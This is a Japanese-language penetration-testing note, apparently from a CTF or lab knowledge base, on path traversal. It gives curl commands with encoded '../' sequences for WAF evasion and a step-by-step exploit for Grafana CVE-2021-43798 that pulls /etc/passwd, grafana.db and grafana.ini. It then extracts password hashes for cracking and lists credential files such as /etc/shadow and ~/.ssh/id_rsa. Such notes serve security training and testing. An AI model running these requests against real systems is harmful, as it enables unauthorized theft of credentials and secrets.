# パストラバーサル（ディレクトリトラバーサル）

## 概要

Webアプリケーションがファイルパスのサニタイズを適切に行っていない場合、`../` 等のシーケンスを使ってWebルート外のファイルを読み取れる。アプリ固有の既知CVEとして公開されているケースも多い。

---

## 着火条件

- Webサービスが動いており、バージョンが特定できた
- そのバージョンにパストラバーサルのCVEが存在する（searchsploit / NVD で確認）
- ファイルダウンロード・プラグイン読み込み・画像表示など、パスを受け取るエンドポイントがある

---

## 観点・着眼点

バージョンが判明した段階で、**即座にCVEを検索する習慣**をつける。有名なOSSダッシュボード・監視ツール（Grafana, Kibana, Splunk 等）はバージョン依存の既知脆弱性が多い。

パストラバーサルが刺さる場合、最初に確認すべきファイル：

| 確認対象 | パス | 目的 |
|---------|------|------|
| OS ユーザー情報 | `/etc/passwd` | ユーザー名・シェルの確認 |
| ホスト情報 | `/etc/hosts` | Docker コンテナかどうかの確認 |
| OS バージョン | `/etc/os-release` | 環境把握 |
| アプリの設定ファイル | アプリ依存（後述） | 認証情報・シークレット |
| アプリのデータベース | アプリ依存（後述） | ユーザー・パスワードハッシュ |

**`/etc/hosts` でコンテナか否かを確認する：**
ホスト名がランダムな16進数文字列（例: `172.17.0.2 e6ff5b1cbc85`）であればDockerコンテナ内で動作している。コンテナIDが判明すれば後続の悪用で使える。

---

## 手順

### 基本的なパストラバーサルの試行

```bash
# シンプルなトラバーサル
curl -v --path-as-is "http://[IP]/[ENDPOINT]/../../../etc/passwd"

# エンコードを試みる（WAFがある場合）
curl -v "http://[IP]/[ENDPOINT]/..%2F..%2F..%2Fetc%2Fpasswd"

# ダブルエンコード
curl -v "http://[IP]/[ENDPOINT]/..%252F..%252F..%252Fetc%252Fpasswd"
```

---

## Grafana パストラバーサル（CVE-2021-43798）

### 着火条件
- Grafana 8.0.0 〜 8.3.0 が動いている（`/api/health` でバージョン確認）
- 修正バージョン 8.3.1 以降でなければ有効

### バージョン確認
```bash
curl -s http://[IP]:[PORT]/api/health
# {"commit":"...","database":"ok","version":"8.0.0"}
```

### 手順

```bash
# /etc/passwd を取得（コンテナ内）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/passwd"

# /etc/hosts を取得（コンテナか否かの確認）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/hosts"

# Grafana SQLite データベースを取得
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db

# Grafana 設定ファイルを取得（secret_key 等が含まれる）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini" \
  -o grafana.ini
```

**プラグイン名は何でもよい（`alertlist` 以外でも動作する）:**
- `alertlist`, `text`, `graph`, `table` など、インストール済みプラグインならいずれでも可

### SQLite データベースからハッシュを取得

```bash
# ユーザーテーブルを抽出
sqlite3 grafana.db "SELECT id, name, login, email, password, salt FROM user;"

# 出力例:
# 1||admin|admin@localhost|[HASH]|[SALT]
# 2|username|username|user@domain|[HASH]|[SALT]
```

→ 取得したハッシュのクラック: `../../05_Tools_Reference/Hashcat.md`（PBKDF2-HMAC-SHA256 / mode 10900）

→ 認証情報の取り扱い: `../Credential_Discovery.md`

---

## アプリケーション別の重要ファイルパス

| アプリ | データベース / 設定ファイル |
|-------|--------------------------|
| Grafana | `/var/lib/grafana/grafana.db` （SQLite）, `/etc/grafana/grafana.ini` |
| WordPress | `/var/www/html/wp-config.php` |
| Tomcat | `/opt/tomcat/conf/tomcat-users.xml` |
| Jenkins | `/var/jenkins_home/secrets/initialAdminPassword` |
| GitLab | `/etc/gitlab/gitlab.rb` |
| Generic Linux | `/etc/passwd`, `/etc/shadow`, `~/.ssh/id_rsa`, `~/.bash_history` |

---

## 注意点・落とし穴

- `--path-as-is` オプションを使わないと `curl` が `../` を正規化してしまう
- WAFが `../` を検出する場合はエンコード（`%2F`, `%252F`）を試みる
- Dockerコンテナ内でのパストラバーサルはコンテナ内のファイルしか読めない（ホストは不可）
  - ただしコンテナ内のアプリ設定DB（Grafana等）は取得できる
- 取得したファイルが空 or エラーの場合：パスが異なる可能性。`/proc/self/cwd` や `/proc/self/environ` で現在のパスを確認
- 失敗した手法の記録：エンコードなしの `../` のみ試して失敗するケースは多い。必ずエンコードも試す

---

## 関連技術

- バージョン確認・CVE 検索 → `../../01_Reconnaissance/Web_Enumeration.md`
- searchsploit でのエクスプロイト検索 → `../../05_Tools_Reference/Searchsploit.md`
- 取得したDB/設定ファイルからの認証情報抽出 → `../Credential_Discovery.md`
- Grafana ハッシュのクラック（PBKDF2-HMAC-SHA256） → `../../05_Tools_Reference/Hashcat.md`
